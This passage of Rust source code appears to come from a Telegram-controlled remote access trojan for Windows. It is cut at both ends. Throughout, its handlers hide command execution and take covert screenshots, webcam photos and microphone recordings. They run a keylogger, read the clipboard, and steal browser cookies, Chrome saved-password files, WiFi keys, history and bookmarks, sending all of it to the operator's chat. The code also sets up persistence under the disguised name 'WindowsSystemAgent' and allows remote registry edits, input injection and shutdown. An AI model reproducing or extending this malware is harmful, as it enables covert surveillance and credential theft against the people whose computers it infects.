            format!("{:x}", digest)
        },
        "sha1" => {
            use sha1::Sha1;
            use sha1::digest::Digest;
            let mut hasher = Sha1::new();
            hasher.update(&data);
            hex::encode(hasher.finalize())
        },
        "sha256" => {
            let mut hasher = Sha256::new();
            hasher.update(&data);
            hex::encode(hasher.finalize())
        },
        "sha512" => {
            use sha2::Sha512;
            let mut hasher = Sha512::new();
            hasher.update(&data);
            hex::encode(hasher.finalize())
        },
        _ => {
            bot.send_message(msg.chat.id, "❌ Unknown algorithm").await?;
            return Ok(());
        }
    };
    
    bot.send_message(msg.chat.id, format!("✅ **{}**\n`{}`", algorithm.to_uppercase(), hash)).await?;
    Ok(())
}

async fn cmd_zip(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /zip <source> <dest.zip>").await?;
        return Ok(());
    }
    
    let source = PathBuf::from(args[0]);
    let dest = PathBuf::from(args[1]);
    
    if !source.exists() {
        bot.send_message(msg.chat.id, "❌ Source not found").await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("🗜️ Creating archive `{}`...", dest.display())).await?;
    
    let file = std_fs::File::create(&dest)?;
    let mut zip = ZipWriter::new(file);
    
    let options = FileOptions::default()
        .compression_method(CompressionMethod::Deflated)
        .unix_permissions(0o755);
    
    if source.is_dir() {
        add_dir_to_zip(&mut zip, &source, &source, options)?;
    } else {
        zip.start_file(source.file_name().unwrap().to_string_lossy(), options)?;
        let mut f = std_fs::File::open(&source)?;
        std::io::copy(&mut f, &mut zip)?;
    }
    
    zip.finish()?;
    
    let size = dest.metadata()?.len();
    bot.send_message(msg.chat.id, format!("✅ Archive created: `{}` ({} MB)", dest.display(), size / 1024 / 1024)).await?;
    Ok(())
}

fn add_dir_to_zip(zip: &mut ZipWriter<std_fs::File>, base: &Path, dir: &Path, options: FileOptions) -> Result<()> {
    for entry in std_fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let name = path.strip_prefix(base).unwrap().to_string_lossy();
        
        if path.is_dir() {
            zip.add_directory(name, options)?;
            add_dir_to_zip(zip, base, &path, options)?;
        } else {
            zip.start_file(name, options)?;
            let mut f = std_fs::File::open(&path)?;
            std::io::copy(&mut f, zip)?;
        }
    }
    Ok(())
}

async fn cmd_unzip(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /unzip <file.zip> <destination>").await?;
        return Ok(());
    }
    
    let zip_file = PathBuf::from(args[0]);
    let dest = PathBuf::from(args[1]);
    
    if !zip_file.exists() {
        bot.send_message(msg.chat.id, "❌ Zip file not found").await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("📂 Extracting `{}` to `{}`...", zip_file.display(), dest.display())).await?;
    
    fs::create_dir_all(&dest).await?;
    
    let zip_file_clone = zip_file.clone();
    let dest_clone = dest.clone();
    
    let result = tokio::task::spawn_blocking(move || -> Result<usize> {
        let file = std_fs::File::open(&zip_file_clone)?;
        let mut archive = ZipArchive::new(file)?;
        let count = archive.len();
        
        for i in 0..archive.len() {
            let mut file = archive.by_index(i)?;
            let outpath = dest_clone.join(file.name());
            
            if file.name().ends_with('/') {
                std_fs::create_dir_all(&outpath)?;
            } else {
                if let Some(p) = outpath.parent() {
                    std_fs::create_dir_all(p)?;
                }
                let mut outfile = std_fs::File::create(&outpath)?;
                std::io::copy(&mut file, &mut outfile)?;
            }
        }
        
        Ok(count)
    }).await??;
    
    bot.send_message(msg.chat.id, format!("✅ Extracted {} files to `{}`", result, dest.display())).await?;
    Ok(())
}

async fn cmd_run(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /run <file> [args]").await?;
        return Ok(());
    }
    
    let program = args[0];
    let program_args = &args[1..];
    
    if !Path::new(program).exists() {
        bot.send_message(msg.chat.id, "❌ File not found").await?;
        return Ok(());
    }
    
    bot.send_message(msg.chat.id, format!("🚀 Running `{}`...", program)).await?;
    
    log_command(program, program_args);
    let output = Command::new(program)
        .args(program_args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .output()?;
    
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();

    let stdout_display = if stdout.is_empty() { "<empty>".to_string() } else { stdout.clone() };
    let stderr_display = if stderr.is_empty() { "<empty>".to_string() } else { stderr.clone() };

    let result = format!(
        "**Exit Code**: {}\n\n**STDOUT**:\n{}\n\n**STDERR**:\n{}",
        output.status.code().unwrap_or(-1),
        stdout_display,
        stderr_display
    );
    
    send_long_text(bot, msg.chat.id, &result, "run_output.txt").await?;
    Ok(())
}

async fn cmd_run_powershell(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /run_powershell <command>").await?;
        return Ok(());
    }
    
    let command = args.join(" ");
    let ps_args = ["-Command", &command];
    
    bot.send_message(msg.chat.id, "🚀 Running PowerShell command...").await?;
    
    log_command("powershell", &ps_args);
    let output = Command::new("powershell")
        .args(&ps_args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .output()?;
    
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();

    let stdout_display = if stdout.is_empty() { "<empty>".to_string() } else { stdout.clone() };
    let stderr_display = if stderr.is_empty() { "<empty>".to_string() } else { stderr.clone() };

    let result = format!(
        "**Exit Code**: {}\n\n**STDOUT**:\n{}\n\n**STDERR**:\n{}",
        output.status.code().unwrap_or(-1),
        stdout_display,
        stderr_display
    );
    
    send_long_text(bot, msg.chat.id, &result, "powershell_output.txt").await?;
    Ok(())
}

async fn cmd_screenshot(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let region = if args.len() >= 4 {
        Some((
            args[0].parse::<i32>().unwrap_or(0),
            args[1].parse::<i32>().unwrap_or(0),
            args[2].parse::<u32>().unwrap_or(0),
            args[3].parse::<u32>().unwrap_or(0)
        ))
    } else {
        None
    };
    
    let path = screenshot::take_screenshot_with_region(region).await?;
    
    bot.send_photo(msg.chat.id, InputFile::file(&path)).await?;
    let _ = fs::remove_file(path).await;
    Ok(())
}

async fn cmd_screenshot_multi(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let count = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(3).min(10);
    let delay = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(1);
    
    bot.send_message(msg.chat.id, format!("📸 Taking {} screenshots with {}s...", count, delay)).await?;
    
    for i in 0..count {
        let path = screenshot::take_screenshot().await?;
        bot.send_photo(msg.chat.id, InputFile::file(&path)).await?;
        let _ = fs::remove_file(path).await;
        
        if i < count - 1 {
            sleep(Duration::from_secs(delay)).await;
        }
    }
    
    Ok(())
}

async fn cmd_camphoto(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "📷 Capturing photo...").await?;
    
    match camera::take_photo().await {
        Ok(path) => {
            bot.send_photo(msg.chat.id, InputFile::file(&path)).await?;
            let _ = fs::remove_file(path).await;
        }
        Err(e) => {
            bot.send_message(msg.chat.id, format!("❌ Camera error: {}", e)).await?;
        }
    }
    
    Ok(())
}

async fn cmd_microfon(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let seconds = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(5).min(30);
    
    bot.send_message(msg.chat.id, format!("🎤 Recording {}s...", seconds)).await?;
    
    match audio::record_audio(seconds).await {
        Ok(path) => {
            bot.send_audio(msg.chat.id, InputFile::file(&path)).await?;
            let _ = fs::remove_file(path).await;
        }
        Err(e) => {
            bot.send_message(msg.chat.id, format!("❌ Audio error: {}", e)).await?;
        }
    }
    
    Ok(())
}

async fn cmd_record_audio(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    cmd_microfon(bot, msg, args).await
}

async fn cmd_keylog_start(bot: Bot, msg: Message) -> Result<()> {
    let mut kl_guard = KEYLOGGER.lock().await;
    if kl_guard.is_some() {
        bot.send_message(msg.chat.id, "⚠️ Keylogger already running").await?;
        return Ok(());
    }
    
    match keylogger::KeyLogger::start() {
        Ok(kl) => {
            *kl_guard = Some(kl);
            bot.send_message(msg.chat.id, "✅ Keylogger started").await?;
        }
        Err(e) => {
            bot.send_message(msg.chat.id, format!("❌ Failed to start: {}", e)).await?;
        }
    }
    Ok(())
}

async fn cmd_keylog_stop(bot: Bot, msg: Message) -> Result<()> {
    let mut kl_guard = KEYLOGGER.lock().await;
    if let Some(kl) = kl_guard.take() {
        kl.stop();
        bot.send_message(msg.chat.id, "✅ Keylogger stopped").await?;
    } else {
        bot.send_message(msg.chat.id, "❌ Keylogger not running").await?;
    }
    Ok(())
}

fn escape_markdown(text: &str) -> String {
    let special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    let mut escaped = String::with_capacity(text.len() * 2);
    
    for c in text.chars() {
        if special_chars.contains(&c) {
            escaped.push('\\');
        }
        escaped.push(c);
    }
    escaped
}

async fn cmd_keylog_dump(bot: Bot, msg: Message) -> Result<()> {
    let log = keylogger::KeyLogger::get_log();
    if log.is_empty() {
        bot.send_message(msg.chat.id, "📭 No logs").await?;
    } else {
        let temp_dir = std::env::temp_dir();
        let log_file = temp_dir.join(format!("keylog_{}.txt", chrono::Local::now().format("%Y%m%d_%H%M%S")));
        std_fs::write(&log_file, log)?;
        
        bot.send_document(msg.chat.id, InputFile::file(&log_file)).await?;
        
        let _ = std_fs::remove_file(&log_file);
    }
    Ok(())
}

async fn cmd_keylog_clear(bot: Bot, msg: Message) -> Result<()> {
    keylogger::KeyLogger::clear_log();
    bot.send_message(msg.chat.id, "🧹 Log cleared").await?;
    Ok(())
}

async fn cmd_keylog_status(bot: Bot, msg: Message) -> Result<()> {
    let kl_guard = KEYLOGGER.lock().await;
    let status = if kl_guard.is_some() { "🟢 Active" } else { "⚫ Stopped" };
    
    bot.send_message(msg.chat.id, format!(
        "**⌨️ Keylogger Status**\n\nStatus: {}\nLog size: {}",
        status,
        keylogger::KeyLogger::log_size()
    )).await?;
    
    Ok(())
}

async fn cmd_clipboard(bot: Bot, msg: Message) -> Result<()> {
    let content = clipboard::get_clipboard();
    
    if content.is_empty() {
        bot.send_message(msg.chat.id, "📋 Clipboard is empty").await?;
    } else {
        send_long_text(bot, msg.chat.id, &content, "clipboard.txt").await?;
    }
    
    Ok(())
}

async fn cmd_clipboard_set(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /clipboard_set <text>").await?;
        return Ok(());
    }
    
    let text = args.join(" ");
    
    if clipboard::set_clipboard(&text).is_ok() {
        bot.send_message(msg.chat.id, "✅ Clipboard set").await?;
    } else {
        bot.send_message(msg.chat.id, "❌ Failed to set clipboard").await?;
    }
    
    Ok(())
}

async fn cmd_monitor(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let seconds = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(30).min(120);
    
    bot.send_message(msg.chat.id, format!("👁️ Monitoring for {}...", seconds)).await?;
    
    let start = std::time::Instant::now();
    let mut last_title = String::new();
    
    while start.elapsed().as_secs() < seconds {
        let title = window_monitor::active_window_title();
        
        if !title.is_empty() && title != last_title {
            bot.send_message(msg.chat.id, format!("🪟 Active: {}", title)).await?;
            last_title = title;
        }
        
        sleep(Duration::from_secs(2)).await;
    }
    
    bot.send_message(msg.chat.id, "✅ Monitoring finished").await?;
    Ok(())
}

async fn cmd_monitor_system(bot: Bot, msg: Message) -> Result<()> {
    let monitor = SYSTEM_MONITOR.lock().await;
    bot.send_message(msg.chat.id, monitor.get_report()).await?;
    Ok(())
}

async fn cmd_monitor_network(bot: Bot, msg: Message) -> Result<()> {
    let monitor = NETWORK_MONITOR.lock().await;
    let mut report = String::from("🌐 **Network Status**\n\n");
    for (name, iface) in &monitor.interfaces {
        report.push_str(&format!("**{}**:\n  IP: {:?}\n  MAC: {}\n  Status: {}\n",
            name, iface.ipv4, iface.mac, iface.status));
    }
    report.push_str(&format!("\n**Connections:** {}\n", monitor.connections.len()));
    bot.send_message(msg.chat.id, report).await?;
    Ok(())
}

async fn cmd_monitor_processes(bot: Bot, msg: Message) -> Result<()> {
    let monitor = PROCESS_MONITOR.lock().await;
    let mut report = String::from("⚙️ **Top Processes by CPU**\n\n");
    let mut procs: Vec<_> = monitor.processes.values().collect();
    procs.sort_by(|a, b| b.cpu_usage.partial_cmp(&a.cpu_usage).unwrap());
    for p in procs.iter().take(10) {
        report.push_str(&format!("{} (PID {}): {:.1}% CPU, {:.1} MB\n",
            p.name, p.pid, p.cpu_usage, p.memory_usage as f64 / 1024.0 / 1024.0));
    }
    if !monitor.alerts.is_empty() {
        report.push_str("\n**Alerts:**\n");
        for a in monitor.alerts.iter().rev().take(5) {
            report.push_str(&format!("[{}] {}: {}\n",
                a.timestamp.format("%H:%M:%S"), a.name, a.message));
        }
    }
    bot.send_message(msg.chat.id, report).await?;
    Ok(())
}

async fn cmd_monitor_files(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let path = if args.is_empty() {
        std::env::current_dir()?
    } else {
        PathBuf::from(args.join(" "))
    };
    let mut monitor = FILE_MONITOR.lock().await;
    monitor.watched_dirs.insert(path.clone());
    bot.send_message(msg.chat.id, format!("👁️ Watching {}", path.display())).await?;
    Ok(())
}

async fn cmd_monitor_registry(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let key = if args.is_empty() {
        "HKCU\\Software".to_string()
    } else {
        args.join(" ")
    };
    let mut monitor = REGISTRY_MONITOR.lock().await;
    monitor.watched_keys.insert(key.clone());
    bot.send_message(msg.chat.id, format!("👁️ Watching registry: {}", key)).await?;
    Ok(())
}

async fn cmd_monitor_temperature(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "🌡️ **Temperature monitoring is disabled**").await?;
    Ok(())
}

async fn cmd_monitor_power(bot: Bot, msg: Message) -> Result<()> {
    let monitor = POWER_MONITOR.lock().await;
    let source = match monitor.power_source {
        PowerSource::AC => "🔌 AC Power",
        PowerSource::Battery => "🔋 Battery",
        _ => "❓ Unknown",
    };
    let mut report = format!("⚡ **Power Status**\n\nSource: {}\n", source);
    if let Some(bat) = &monitor.battery {
        report.push_str(&format!(
            "Charge: {:.1}%\nStatus: {:?}\nHealth: {:.1}%\n",
            bat.charge_percent, bat.status, bat.health
        ));
    }
    bot.send_message(msg.chat.id, report).await?;
    Ok(())
}

async fn cmd_alerts(bot: Bot, msg: Message) -> Result<()> {
    let monitor = PROCESS_MONITOR.lock().await;
    let mut alerts = String::from("⚠️ **System Alerts**\n\n");
    for a in monitor.alerts.iter().rev().take(20) {
        alerts.push_str(&format!("[{}] {:?}: {}\n",
            a.timestamp.format("%Y-%m-%d %H:%M:%S"),
            a.severity,
            a.message
        ));
    }
    bot.send_message(msg.chat.id, alerts).await?;
    Ok(())
}

async fn cmd_steal_cookies(bot: Bot, msg: Message) -> Result<()> {
    let cookies = cookie_stealer::find_cookies();
    
    if cookies.is_empty() {
        bot.send_message(msg.chat.id, "🍪 No cookie files found").await?;
    } else {
        bot.send_message(msg.chat.id, format!("🍪 Found {} cookie files", cookies.len())).await?;
        
        for path in cookies {
            if path.exists() {
                bot.send_document(msg.chat.id, InputFile::file(path)).await?;
            }
        }
    }
    
    Ok(())
}

async fn cmd_steal_passwords(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "🔑 Searching for saved passwords...").await?;
    
    let mut passwords = Vec::new();
    
    if let Some(local_app_data) = dirs::data_local_dir() {
        let chrome_login_data = local_app_data
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default")
            .join("Login Data");
        
        if chrome_login_data.exists() {
            passwords.push(chrome_login_data);
        }
    }
    
    if passwords.is_empty() {
        bot.send_message(msg.chat.id, "❌ No password files found").await?;
    } else {
        bot.send_message(msg.chat.id, format!("🔑 Found {} password files", passwords.len())).await?;
        
        for path in passwords {
            bot.send_document(msg.chat.id, InputFile::file(path)).await?;
        }
    }
    
    Ok(())
}

async fn cmd_steal_wifi_passwords(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "📶 Retrieving WiFi passwords...").await?;
    
    let args1 = ["wlan", "show", "profiles"];
    log_command("netsh", &args1);
    let output = Command::new("netsh")
        .args(&args1)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let profiles = String::from_utf8_lossy(&output.stdout);
    let mut passwords = String::new();
    
    for line in profiles.lines() {
        if line.contains("All User Profile") {
            if let Some(profile) = line.split(':').nth(1) {
                let profile = profile.trim();
                
                let args2 = ["wlan", "show", "profile", profile, "key=clear"];
                log_command("netsh", &args2);
                let output = Command::new("netsh")
                    .args(&args2)
                    .creation_flags(0x08000008)
                    .stdin(std::process::Stdio::null())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::null())
                    .output()?;
                
                let details = String::from_utf8_lossy(&output.stdout);
                
                for detail_line in details.lines() {
                    if detail_line.contains("Key Content") {
                        if let Some(password) = detail_line.split(':').nth(1) {
                            passwords.push_str(&format!("{}: {}\n", profile, password.trim()));
                        }
                    }
                }
            }
        }
    }
    
    if passwords.is_empty() {
        bot.send_message(msg.chat.id, "❌ No WiFi passwords found").await?;
    } else {
        send_long_text(bot, msg.chat.id, &passwords, "wifi_passwords.txt").await?;
    }
    
    Ok(())
}

async fn cmd_steal_history(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "📜 Collecting browser history...").await?;

    let mut history = Vec::new();
    if let Ok(chrome) = browser_stealer::get_chrome_history() {
        history.extend(chrome);
    }
    if let Ok(firefox) = browser_stealer::get_firefox_history() {
        history.extend(firefox);
    }

    if history.is_empty() {
        bot.send_message(msg.chat.id, "❌ No history found").await?;
    } else {
        let text = history.join("\n");
        send_long_text(bot, msg.chat.id, &text, "history.txt").await?;
    }
    Ok(())
}

async fn cmd_steal_bookmarks(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "🔖 Collecting bookmarks...").await?;

    let mut bookmarks = Vec::new();
    if let Ok(chrome) = browser_stealer::get_chrome_bookmarks() {
        bookmarks.extend(chrome);
    }

    if bookmarks.is_empty() {
        bot.send_message(msg.chat.id, "❌ No bookmarks found").await?;
    } else {
        let text = bookmarks.join("\n");
        send_long_text(bot, msg.chat.id, &text, "bookmarks.txt").await?;
    }
    Ok(())
}

async fn cmd_key_press(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /key <key>").await?;
        return Ok(());
    }
    
    let key = args.join(" ");
    
    match emulate_key(&key) {
        Ok(_) => bot.send_message(msg.chat.id, format!("✅ Pressed: {}", key)).await?,
        Err(e) => bot.send_message(msg.chat.id, format!("❌ Failed: {}", e)).await?,
    };
    
    Ok(())
}

async fn cmd_type_text(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /type <text>").await?;
        return Ok(());
    }
    
    let text = args.join(" ");
    
    match type_text(&text) {
        Ok(_) => bot.send_message(msg.chat.id, format!("✅ Typed: {}", text)).await?,
        Err(e) => bot.send_message(msg.chat.id, format!("❌ Failed: {}", e)).await?,
    };
    
    Ok(())
}

async fn cmd_mouse_move(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.len() < 2 {
        bot.send_message(msg.chat.id, "Usage: /mouse_move <x> <y>").await?;
        return Ok(());
    }
    
    let x: i32 = args[0].parse()?;
    let y: i32 = args[1].parse()?;
    
    match move_mouse(x, y) {
        Ok(_) => bot.send_message(msg.chat.id, format!("✅ Mouse moved to ({}, {})", x, y)).await?,
        Err(e) => bot.send_message(msg.chat.id, format!("❌ Failed: {}", e)).await?,
    };
    
    Ok(())
}

async fn cmd_mouse_click(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let button = args.get(0).unwrap_or(&"left").to_string();
    
    match click_mouse(&button) {
        Ok(_) => bot.send_message(msg.chat.id, format!("✅ Clicked {}", button)).await?,
        Err(e) => bot.send_message(msg.chat.id, format!("❌ Failed: {}", e)).await?,
    };
    
    Ok(())
}

async fn cmd_mouse_position(bot: Bot, msg: Message) -> Result<()> {
    match get_mouse_position() {
        Ok((x, y)) => bot.send_message(msg.chat.id, format!("🖱️ Mouse position: ({}, {})", x, y)).await?,
        Err(e) => bot.send_message(msg.chat.id, format!("❌ Failed: {}", e)).await?,
    };
    
    Ok(())
}

fn emulate_key(key: &str) -> Result<()> {
    use enigo::{Enigo, Keyboard, Key, Settings, Direction};
    
    let mut enigo = Enigo::new(&Settings::default()).map_err(|_| anyhow!("Failed to create Enigo"))?;
    
    match key.to_lowercase().as_str() {
        "enter" => enigo.key(Key::Return, Direction::Click)?,
        "space" => enigo.key(Key::Space, Direction::Click)?,
        "tab" => enigo.key(Key::Tab, Direction::Click)?,
        "esc" => enigo.key(Key::Escape, Direction::Click)?,
        "backspace" => enigo.key(Key::Backspace, Direction::Click)?,
        "delete" => enigo.key(Key::Delete, Direction::Click)?,
        "home" => enigo.key(Key::Home, Direction::Click)?,
        "end" => enigo.key(Key::End, Direction::Click)?,
        "pageup" => enigo.key(Key::PageUp, Direction::Click)?,
        "pagedown" => enigo.key(Key::PageDown, Direction::Click)?,
        "up" => enigo.key(Key::UpArrow, Direction::Click)?,
        "down" => enigo.key(Key::DownArrow, Direction::Click)?,
        "left" => enigo.key(Key::LeftArrow, Direction::Click)?,
        "right" => enigo.key(Key::RightArrow, Direction::Click)?,
        "f1" => enigo.key(Key::F1, Direction::Click)?,
        "f2" => enigo.key(Key::F2, Direction::Click)?,
        "f3" => enigo.key(Key::F3, Direction::Click)?,
        "f4" => enigo.key(Key::F4, Direction::Click)?,
        "f5" => enigo.key(Key::F5, Direction::Click)?,
        "f6" => enigo.key(Key::F6, Direction::Click)?,
        "f7" => enigo.key(Key::F7, Direction::Click)?,
        "f8" => enigo.key(Key::F8, Direction::Click)?,
        "f9" => enigo.key(Key::F9, Direction::Click)?,
        "f10" => enigo.key(Key::F10, Direction::Click)?,
        "f11" => enigo.key(Key::F11, Direction::Click)?,
        "f12" => enigo.key(Key::F12, Direction::Click)?,
        _ => {
            if key.len() == 1 {
                enigo.text(key)?;
            } else {
                return Err(anyhow!("Unknown key: {}", key));
            }
        }
    }
    
    Ok(())
}

fn type_text(text: &str) -> Result<()> {
    use enigo::{Enigo, Keyboard, Settings};
    
    let mut enigo = Enigo::new(&Settings::default()).map_err(|_| anyhow!("Failed to create Enigo"))?;
    enigo.text(text)?;
    Ok(())
}

fn move_mouse(x: i32, y: i32) -> Result<()> {
    use enigo::{Enigo, Mouse, Settings, Coordinate};
    
    let mut enigo = Enigo::new(&Settings::default()).map_err(|_| anyhow!("Failed to create Enigo"))?;
    enigo.move_mouse(x, y, Coordinate::Abs)?;
    Ok(())
}

fn click_mouse(button: &str) -> Result<()> {
    use enigo::{Enigo, Mouse, Button, Settings, Direction};
    
    let mut enigo = Enigo::new(&Settings::default()).map_err(|_| anyhow!("Failed to create Enigo"))?;
    
    match button.to_lowercase().as_str() {
        "left" => enigo.button(Button::Left, Direction::Click)?,
        "right" => enigo.button(Button::Right, Direction::Click)?,
        "middle" => enigo.button(Button::Middle, Direction::Click)?,
        _ => return Err(anyhow!("Unknown button: {}", button)),
    }
    
    Ok(())
}

fn get_mouse_position() -> Result<(i32, i32)> {
    use enigo::{Enigo, Settings};
    
    let enigo = Enigo::new(&Settings::default()).map_err(|_| anyhow!("Failed to create Enigo"))?;
    let (x, y) = enigo.location().map_err(|_| anyhow!("Failed to get mouse location"))?;
    Ok((x, y))
}

async fn cmd_autostart(bot: Bot, msg: Message) -> Result<()> {
    match autostart::setup_autostart() {
        Ok(_) => {
            bot.send_message(msg.chat.id, "✅ Added to autostart").await?;
        }
        Err(e) => {
            bot.send_message(msg.chat.id, format!("❌ Failed: {}", e)).await?;
        }
    };
    
    Ok(())
}

async fn cmd_autostart_remove(bot: Bot, msg: Message) -> Result<()> {
    let args = ["delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "WindowsSystemAgent", "/f"];
    log_command("reg", &args);
    let _ = Command::new("reg")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status();
    
    bot.send_message(msg.chat.id, "✅ Removed from autostart").await?;
    Ok(())
}

async fn cmd_registry(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    if args.is_empty() {
        bot.send_message(msg.chat.id, "Usage: /registry <get|set|delete> <key> [value]").await?;
        return Ok(());
    }
    
    let action = args[0];
    
    match action {
        "get" => {
            if args.len() < 2 {
                bot.send_message(msg.chat.id, "Usage: /registry get <key>").await?;
                return Ok(());
            }
            let key = args[1..].join(" ");
            match registry::Registry::get(&key) {
                Ok(val) => bot.send_message(msg.chat.id, format!("📝 Value: {}", val)).await?,
                Err(e) => bot.send_message(msg.chat.id, format!("❌ Error: {}", e)).await?,
            };
        }
        "set" => {
            if args.len() < 3 {
                bot.send_message(msg.chat.id, "Usage: /registry set <key> <value>").await?;
                return Ok(());
            }
            let key = args[1];
            let val = args[2..].join(" ");
            match registry::Registry::set(key, &val) {
                Ok(_) => bot.send_message(msg.chat.id, "✅ Registry value set").await?,
                Err(e) => bot.send_message(msg.chat.id, format!("❌ Error: {}", e)).await?,
            };
        }
        "delete" => {
            if args.len() < 2 {
                bot.send_message(msg.chat.id, "Usage: /registry delete <key>").await?;
                return Ok(());
            }
            let key = args[1..].join(" ");
            match registry::Registry::delete(&key) {
                Ok(_) => bot.send_message(msg.chat.id, "✅ Registry key deleted").await?,
                Err(e) => bot.send_message(msg.chat.id, format!("❌ Error: {}", e)).await?,
            };
        }
        _ => {
            bot.send_message(msg.chat.id, "❌ Unknown action. Use get, set, or delete").await?;
        }
    }
    
    Ok(())
}

async fn cmd_services(bot: Bot, msg: Message) -> Result<()> {
    let args = ["-Command", "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object Name, DisplayName, Status | Format-Table -AutoSize"];
    log_command("powershell", &args);
    let output = Command::new("powershell")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let services = String::from_utf8_lossy(&output.stdout);
    
    send_long_text(bot, msg.chat.id, &services, "services.txt").await?;
    Ok(())
}

async fn cmd_scheduled_tasks(bot: Bot, msg: Message) -> Result<()> {
    let args = ["/query", "/fo", "LIST", "/v"];
    log_command("schtasks", &args);
    let output = Command::new("schtasks")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()?;
    
    let tasks = String::from_utf8_lossy(&output.stdout);
    
    send_long_text(bot, msg.chat.id, &tasks, "tasks.txt").await?;
    Ok(())
}

async fn cmd_pcoff(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let seconds = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(60);
    
    bot.send_message(msg.chat.id, format!("🔌 Shutting down in {} seconds", seconds)).await?;
    
    let shutdown_args = ["/s", "/t", &seconds.to_string()];
    log_command("shutdown", &shutdown_args);
    Command::new("shutdown")
        .args(&shutdown_args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    Ok(())
}

async fn cmd_restart(bot: Bot, msg: Message, args: Vec<&str>) -> Result<()> {
    let seconds = args.get(0).and_then(|s| s.parse().ok()).unwrap_or(60);
    
    bot.send_message(msg.chat.id, format!("🔄 Restarting in {} seconds", seconds)).await?;
    
    let shutdown_args = ["/r", "/t", &seconds.to_string()];
    log_command("shutdown", &shutdown_args);
    Command::new("shutdown")
        .args(&shutdown_args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    Ok(())
}

async fn cmd_hibernate(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "💤 Hibernating...").await?;
    
    let args = ["/h"];
    log_command("shutdown", &args);
    Command::new("shutdown")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    Ok(())
}

async fn cmd_sleep(bot: Bot, msg: Message) -> Result<()> {
    bot.send_message(msg.chat.id, "😴 Sleeping...").await?;
    
    let args = ["powrprof.dll,SetSuspendState", "0,1,0"];
    log_command("rundll32.exe", &args);
    Command::new("rundll32.exe")
        .args(&args)
        .creation_flags(0x08000008)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()?;
    
    Ok(())
}

async fn cmd_lock(bot: Bot, msg: Message) -> Result<()> {
    let args = ["user32.dll,LockWorkStation"];
    log_command("rundll32.exe", &args);
    Command::new("rundll32.exe")
        .args(&args)
